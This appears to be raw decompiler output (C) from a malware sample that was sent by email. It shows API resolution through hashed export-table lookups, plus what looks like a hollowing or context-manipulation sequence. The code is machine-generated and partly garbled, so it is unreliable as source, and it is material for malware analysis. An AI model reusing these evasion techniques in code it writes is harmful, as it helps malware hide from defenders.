// subject.c
// Generated on 5/4/2015 12:43:38 AM by decompiling malware_via_email/malware_0111/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000()
{
	return;
}

void fn004013BB(Eq_19 * fs)
{
	word32 eax_14 = LoadLibraryA(globals->t404040);
	fn00401000();
	CloseHandle(0x0000000F);
	globals->ptr404660 = fn00401D92(fs, eax_14, 0x26F009C7);
	fn00401000();
	GetFileType(0x0000005E);
	GetModuleHandleA(0x00000000);
	globals->ptr404664 = fn00401D92(fs, eax_14, 0xFA7E3BA6);
	fn00401000();
	globals->ptr404668 = fn00401D92(fs, eax_14, 0xA690DFF5);
	fn00401000();
	globals->ptr40466C = fn00401D92(fs, eax_14, 0xCADD80EF);
	fn00401000();
	globals->ptr404670 = fn00401D92(fs, eax_14, 0xCADDA8EF);
	fn00401000();
	globals->ptr404674 = fn00401D92(fs, eax_14, 0x94493C3C);
	fn00401000();
	globals->ptr404678 = fn00401D92(fs, eax_14, 0x47BD91CF);
	fn00401000();
	globals->ptr40467C = fn00401D92(fs, eax_14, 0x7A4FA81E);
	fn00401000();
	globals->ptr40425C = fn00401D92(fs, eax_14, 0x276D0321);
	GetModuleFileNameA(0x00000000, 0x00404680, 0x00000104);
	fn00401000();
	lstrcpyA(0x00404784, globals->t40404C);
	fn00401000();
	lstrcatA(0x00404784, globals->t404028);
	lstrcatA(0x00404784, globals->t404050);
	word32 eax_442 = lstrcatA(0x00404784, 0x00404680);
	fn00401000();
	globals->dw404888 = 0x00000044;
	fn00401000();
	globals->dw4048B4 = 0x00000001;
	fn00401000();
	globals->w4048B8 = 0x0002;
	Mem533[0x00404660:word32]();
	fn00401000();
	lstrcpyA(fp - 0x00000024, globals->t404000);
	lstrcatA(fp - 0x00000024, globals->t404038);
	lstrcatA(fp - 0x00000024, globals->t40400C);
	lstrcatA(fp - 0x00000024, globals->t40402C);
	Mem533[0x0040425C:word32]();
	fn00401000();
	globals->ptr4048DC = fn00401D92(fs, fp - 0x00000024, 0xB55B163B);
	fn00401000();
	globals->ptr4048E0 = fn00401D92(fs, fp - 0x00000024, 0xE898BED0);
	fn00401000();
	globals->ptr4048E4 = fn00401D92(fs, fp - 0x00000024, 0xD8BDDDA6);
	globals->ptr4048E8 = fn00401D92(fs, fp - 0x00000024, 0x7AE149A2);
	fn00401000();
	code * eax_765 = fn00401D92(fs, fp - 0x00000024, 0x6B249BF0);
	globals->ptr4048EC = eax_765;
	fn00401000();
	Mem767[0x0040425C:word32]();
	fn00401000();
	code * eax_833 = fn00401D92(fs, 0x00000000, 0xB7CA4B9E);
	globals->ptr4048F0 = eax_833;
	fn00401000();
	fn004018D9();
	Mem835[0x0040467C:word32]();
	return;
}

void fn004018D9()
{
	fn00401000();
	GetModuleHandleA(0x00000000);
	fn00401000();
	Mem0[0x00404664:word32]();
	fn00401000();
	fn00401000();
	Mem0[0x00404668:word32]();
	fn00401000();
	globals->dw4048F4 = 0x00010007;
	Mem196[0x0040466C:word32]();
	fn00401000();
	globals->dw4049AC = 0x0040100B;
	fn00401000();
	Mem231[0x00404670:word32]();
	fn00401000();
	Mem231[0x00404674:word32]();
	return;
}

word32 fn00401D92(Eq_19 * fs, word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc14_15 = fs->dw0000;
	fs->dw0000 = fp - 0x00000014;
	fn00401000();
	fn00401000();
	Eq_286 * edx_91 = dwArg04->dw003C + dwArg04;
	fn00401000();
	Eq_294 * eax_125 = edx_91->dw0078 + dwArg04;
	word16 * eax_129[] = eax_125->dw0024 + dwArg04;
	fn00401000();
	lstrcpyA(fp - 0x0000003C, 0x00403010);
	lstrcpyA(fp - 0x0000003C, 0x0040300E);
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) != 0x00000000)
		dwArg08 = dwArg08 + 0x000DE164;
	fp->dwFFFFFFF8 = 0x0040300C;
	fp->dwFFFFFFF8 = fp - 0x0000003C;
	lstrcpyA(0x00000000, 0x00000000);
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000852;
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) == 0x00000000)
		dwArg08 = dwArg08 + 0x0001CF7D;
	fp->dwFFFFFFF8 = 0xFFFFFFFF;
	word32 * eax_218[] = eax_125->dw0020 + dwArg04;
	word32 * eax_223[] = eax_125->dw001C + dwArg04;
	int32 edi_225 = 0x00000000;
	word32 eax_256;
	while (edi_225 < eax_125->dw0018)
	{
		dwLoc48 = dwLoc48 & 0x00000000;
		word32 eax_277 = eax_218[edi_225] + dwArg04;
		dwLoc50 = dwLoc50 & 0x00000000;
		while (dwLoc50->b0000 != 0x00)
		{
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000006;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000006;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000006;
			fn00401000();
			dwLoc48 = (int32) dwLoc50->b0000 ^ 0x000000F0 ^ (dwLoc48 << 0x00000007 | dwLoc48 >>u 0x00000019);
			dwLoc50 = dwLoc50 + 0x00000001;
		}
		if (dwLoc48 == dwArg08)
		{
			eax_256 = eax_223[(word32) eax_129[edi_225]] + dwArg04;
			goto l00401F83;
		}
		edi_225 = edi_225 + 0x00000001;
	}
	eax_256 = 0x00000000;
l00401F83:
	fs->dw0000 = dwLoc14_15;
	return eax_256;
}

